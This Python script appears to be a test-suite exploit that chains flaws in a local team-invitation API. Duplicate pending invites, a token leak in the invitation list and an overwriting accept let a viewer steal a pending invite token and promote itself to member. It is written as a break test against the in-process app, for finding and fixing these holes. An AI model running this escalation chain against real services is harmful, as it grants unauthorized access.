"""BREAK: viewer self-promote after role allowlist.

PUT /teams/:id/members/:uid is absent. Remaining composition:
duplicate pending invites + GET list leaks token + accept overwrites role.
"""

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from app.auth import API_KEY_A, API_KEY_B
from app.invitations import memberships, reset_for_tests
from app.activity import reset_for_tests as reset_activity
from app.audit import reset_for_tests as reset_audit
from app.comments import reset_for_tests as reset_comments
from app.scripts.module09_test_suite import call


def post(path, key, payload):
    status, _, body = call(
        "POST",
        path,
        body=json.dumps(payload).encode(),
        headers={"X-API-Key": key},
    )
    return status, json.loads(body.decode() or "{}")


def get(path, key):
    status, _, body = call("GET", path, headers={"X-API-Key": key})
    return status, json.loads(body.decode() or "{}")


def put(path, key, payload):
    status, _, body = call(
        "PUT",
        path,
        body=json.dumps(payload).encode(),
        headers={"X-API-Key": key},
    )
    try:
        parsed = json.loads(body.decode() or "{}")
    except json.JSONDecodeError:
        parsed = {"raw": body.decode()[:200]}
    return status, parsed


def main():
    reset_for_tests()
    reset_activity()
    reset_comments()
    reset_audit()

    _, team = post("/teams", API_KEY_A, {"name": "break-team"})
    tid = team["id"]
    uid = "principal-b"

    put_s, put_body = put(
        f"/teams/{tid}/members/{uid}",
        API_KEY_B,
        {"role": "admin"},
    )
    print("BREAK_PUT_MEMBERS_STATUS", put_s)
    print("BREAK_PUT_ENDPOINT_ABSENT", put_s in (404, 405))

    v_s, v_body = post(
        f"/teams/{tid}/invitations",
        API_KEY_A,
        {"email": "b@example.com", "role": "viewer"},
    )
    m_s, m_body = post(
        f"/teams/{tid}/invitations",
        API_KEY_A,
        {"email": "b@example.com", "role": "member"},
    )
    print("BREAK_DUP_VIEWER_INVITE", v_s)
    print("BREAK_DUP_MEMBER_INVITE", m_s)
    print("BREAK_DUP_PENDING_ALLOWED", v_s == 200 and m_s == 200)

    acc_v, _ = post(f"/invitations/{v_body.get('token')}/accept", API_KEY_B, {})
    role_after_viewer = memberships.get((tid, uid))
    print("BREAK_ACCEPT_VIEWER_STATUS", acc_v)
    print("BREAK_ROLE_AFTER_VIEWER", role_after_viewer)

    list_s, listed = get(f"/teams/{tid}/invitations", API_KEY_B)
    items = listed.get("items") or []
    pending = [row for row in items if row.get("status") == "pending" and row.get("token")]
    stolen = pending[0]["token"] if pending else None
    print("BREAK_GET_LIST_STATUS", list_s)
    print("BREAK_GET_LIST_TOKEN_LEAK", bool(stolen))
    print("BREAK_PENDING_AFTER_VIEWER", len(pending))

    acc_m, _ = post(f"/invitations/{stolen}/accept", API_KEY_B, {})
    role_after = memberships.get((tid, uid))
    print("BREAK_ACCEPT_STOLEN_STATUS", acc_m)
    print("BREAK_ROLE_AFTER_SECOND_ACCEPT", role_after)
    print("BREAK_VIEWER_PROMOTED", role_after_viewer == "viewer" and role_after == "member")
    print("BREAK_SURFACE", "duplicate pending invite + GET token leak + accept overwrite")


if __name__ == "__main__":
    main()
